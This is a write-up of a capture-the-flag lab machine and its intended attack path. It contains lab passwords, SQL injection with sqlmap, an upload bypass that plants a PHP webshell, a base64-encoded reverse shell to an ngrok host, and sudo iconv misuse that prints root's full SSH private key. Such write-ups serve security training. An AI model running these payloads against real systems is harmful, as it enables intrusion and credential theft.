# Text

## Introduction

I made this box because I want to learn something new and add experience in the field of cybersecurity , To pwned the machine you just need a basic php code , basic file upload bypass and research.

## Info for HTB

### Access

Passwords:

| User  | Password                            |
| ----- | ----------------------------------- |
| john  |       aDmin@12142csaJQA#            |
| root  |       Tryhpwnme@12142csaJQA#        | 
| admin |        Admin@12132132               |

### Key Processes

This machine are included to `pages/$pages.php` with base64 also we can see the source code the webpage from there we can analayze the code to get user. The vulnerability for this machine is authenticated remote code execution with file upload bypass content type , On Admin Dashboard have upload file content we need upload shell from there also file upload using md5 filename .






### Other

I used setup with a static ip i hope you modify it 



# Writeup


# Enumeration

First of all we enumeration with nmap to scan openport 
```
└─# nmap -sC -sV -p- -T4 --min-rate=9326 --vv test.htb        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-08 22:02 EST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:02
Completed NSE at 22:02, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:02
Completed NSE at 22:02, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:02
Completed NSE at 22:02, 0.00s elapsed
Initiating ARP Ping Scan at 22:02
Scanning test.htb (192.168.179.130) [1 port]
Completed ARP Ping Scan at 22:02, 0.13s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 22:02
Scanning test.htb (192.168.179.130) [65535 ports]
Discovered open port 80/tcp on 192.168.179.130
Discovered open port 22/tcp on 192.168.179.130
Discovered open port 3000/tcp on 192.168.179.130
Completed SYN Stealth Scan at 22:02, 5.40s elapsed (65535 total ports)
Initiating Service scan at 22:02
Scanning 3 services on test.htb (192.168.179.130)

```

Have 3 port only are opened it is 80 , 22 and 3000  . So here port 3000 there is empty nothing there so let's we check port 80

# Foothold
![](2024-02-07-16-01-08.png)

In webpage would redirect to `&page=` that means index.php already included to another file . Look at here there have source code let's we check it out

![](2024-02-07-16-03-27.png)

the source code is nothing important here so let's say we decode the base64 param `page=aW5kZXg=`

![](2024-02-07-16-05-34.png)

Here after i decoded it included with index.php but just index only there read without .php . So now we'll read source code on index.php have parameter `page` . After a few minutes it's failed lol maybe something error there nevermind let's we find another way


```
└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u test.htb
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://test.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 301) [Size: 304] [--> http://test.htb/login/]
/pages                (Status: 301) [Size: 304] [--> http://test.htb/pages/]
/test                 (Status: 301) [Size: 303] [--> http://test.htb/test/]
/javascript           (Status: 301) [Size: 309] [--> http://test.htb/javascript/]
```

I found Admin login on `/adm` and `/login` so we dont have the password for login but this web can read a source code from webpage let's we find the password maybe the password saved in source code .

![](2024-02-09-11-08-28.png)

Only html code on index there just include from `login.php` so we need check again for `login.php`

![](2024-02-09-11-10-57.png)


Need use website encode because i've tried encode using echo command from linux but it's not working so let's we do it

![](2024-02-09-11-12-22.png)

The  login page ain't saved username password in `login.php` there saved on mysql and restore from there . So now we need find SQL injection to get the username password to login admin page .  I have made a decision to find SQL injection from `/login` directory 


![](2024-02-09-11-15-59.png)

Again and again need user pass to login the webpage i'll try using curl on `index.php` to see there prevent auto redirect or not

![](2024-02-09-11-18-28.png)

There vulnerable no redirect . As you can see here have `edit.php` , `delete.php` and `info.php` the param looks like vulnerable Sql injection . Let's we try 



![](2024-02-09-11-20-53.png)

I've tried put ' at the number to see there vulnerable SQL Injection or no and there is error so let's we inject it with automation tools by sqlmap

```
└─# sqlmap -u "http://test.htb/login/edit.php?id=5" --dbs                                                                                                                                  
```

![](2024-02-09-11-22-54.png)

The database is `webedition` so let's we dump again . 

```
└─# sqlmap -u "http://test.htb/login/edit.php?id=5" -D webedition -T users -C username --dump-all
```

```
+----+----------------+----------+
| id | password       | username |
+----+----------------+----------+
| 1  | Admin@12132132 | test     |
| 2  | Admin@12132132 | admin    |
+----+----------------+----------+
```
Now we try login admin login with this user pass .

![](2024-02-09-11-32-48.png)

Successfully login admin page . Now go to edit page and we try upload shell from there . Usually website are support jpg png only let's we try upload jpg first to see that working or no . 

![](2024-02-09-11-36-05.png)

The uploader it's not working so we'll try find another way . Go to `/adm` and login with same username password 

![](2024-02-09-11-50-40.png)

On `/adm` the uploader it's working but there not showing . Let's we find the directory from source code in `dashboard.php`



Here the source code . The uploader only filters content type not extension also generate md5 hash of file name .

```
<?php
session_start();

// Check if the user is logged in
if (!isset($_SESSION['username'])) {
    header('Location: index.php');
    exit();
}

// Include your database connection file
include 'db.php';

// Handle file upload
if (isset($_POST['upload'])) {
    $allowedContentTypes = ['image/png', 'image/jpeg'];

    $targetDirectory = "uploads/";
    $originalFileName = $_FILES["file"]["name"];
    $fileContentType = $_FILES["file"]["type"];

    // Check if the file has an allowed content type
    if (in_array($fileContentType, $allowedContentTypes)) {
        // Generate an MD5 hash for the filename
        $hashedFileName = md5($originalFileName) . '.' . pathinfo($originalFileName, PATHINFO_EXTENSION);
        $targetFile = $targetDirectory . $hashedFileName;

        // Move the uploaded file to the target directory
        if (move_uploaded_file($_FILES["file"]["tmp_name"], $targetFile)) {
            echo "File uploaded successfully.";
        } else {
            echo "Error uploading file.";
        }
    } else {
        echo "Invalid file format. Only PNG and JPEG images are allowed.";
    }
}
?>
```

to get name file you need go to [MD5 Decrypt](https://md5decrypt.net/en/#answer) 

Example:

![](2024-02-09-12-17-06.png)

If your file name is test.jpg copy the file name with that extension and encrypt it you would get  `0412c29576c708cf0155e8de242169b1` so you just append.jpg at the end of name file like this `0412c29576c708cf0155e8de242169b1.jpg` so now let's we upload our shell


```
<?php system($_REQUEST["cmd"]); ?>
```

First of all you should rename your shell to `shell.jpg` and upload with capturing burpsuite and change the Content type and rename name file let me show you


![](2024-02-09-16-03-54.png)

Content type must be `image/png` or `image/jpg` if another these it's not working so we need rename my shell `rce.jpg` to `rce.php`


And now my file successfully uploaded but now idk what the name of file so we need go to md5 decrypter to find my name file

![](2024-02-09-16-06-21.png)

That's my name file `ec4e5b71e22035a5cc4250eea1b5ebed.php`

now goto `/adm/uploads/ec4e5b71e22035a5cc4250eea1b5ebed.php`


![](2024-02-09-16-07-35.png)


It's not working i can access that webshell because .htaccess prevent there so i found the solution is go to index.php and preview that page like this

![](2024-02-09-16-11-53.png)

I included my webshell to this webpage and it's worked 

http://test.htb/index.php?page=Li4vYWRtL3VwbG9hZHMvZWM0ZTViNzFlMjIwMzVhNWNjNDI1MGVlYTFiNWViZWQ=&cmd=id


## To revshell

echo%20%22c2ggLWkgPiYgL2Rldi90Y3AvMC50Y3AuYXAubmdyb2suaW8vMTI4MDIgMD4mMQ==%22%20|%20base64%20-d%20|%20bash


```
─$ nc -lvnp 1337    
listening on [any] 1337 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 44730
sh: 0: can't access tty; job control turned off
$ 
```


My revshell has been connected so we just need find user password . let we check the user

```
$ cat /etc/passwd | grep /home
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
john:x:1000:1000:john:/home/john:/bin/bash
git:x:115:122:Git Version Control,,,:/home/git:/bin/bash
```

The user is john , git just gitea now we using linpeas to find the password

![](2024-02-09-16-22-07.png)

I found a login.db file so lets we check it out


```
$ strings /var/backups/login.db
SQLite format 3
Ytablesqlite_sequencesqlite_sequence
CREATE TABLE sqlite_sequence(name,seq)
tableloginlogin
CREATE TABLE login(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT NOT NULL,
        password TEXT NOT NULL
    )
1johnaDmin@12142csaJQA#
adminpass123
login
```


User:john 
Pass:aDmin@12142csaJQA#

# Privilege Escalation

```
sudo -l
Matching Defaults entries for john on test:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User john may run the following commands on test:
    (root) NOPASSWD: /usr/bin/iconv
```

![](2024-02-09-16-25-23.png)

Iconv only worked for read a file not write a file so we need get id_rsa from /root/.ssh/


LFILE=/root/.ssh/id_rsa

```
sudo iconv -f 8859_1 -t 8859_1 "$LFILE"
-----BEGIN OPENSSH PRIVATE KEY-----
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
jN2N2rma2gsEUAAAAJcm9vdEB0ZXN0AQI=
-----END OPENSSH PRIVATE KEY-----
```

![](2024-02-09-16-27-51.png)

Successfully login as root user

